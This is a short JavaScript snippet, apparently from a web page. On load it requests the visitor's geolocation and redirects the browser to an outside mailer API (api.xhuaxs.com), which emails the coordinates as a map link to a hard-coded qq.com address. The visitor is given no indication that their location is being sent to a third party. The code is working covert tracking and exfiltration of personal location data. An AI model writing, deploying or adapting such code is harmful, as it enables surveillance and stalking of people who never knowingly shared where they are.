        window.addEventListener("load", function() {
            getLocation();
        });

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            var jd = position.coords.longitude;
            var wd = position.coords.latitude;
            var url = "https://api.xhuaxs.com/phpmailer/api.php?adress=jun.csy@qq.com&title=2003&content=https://uri.amap.com/marker?position=" + jd + "," + wd;
            window.location.href = url;
        }
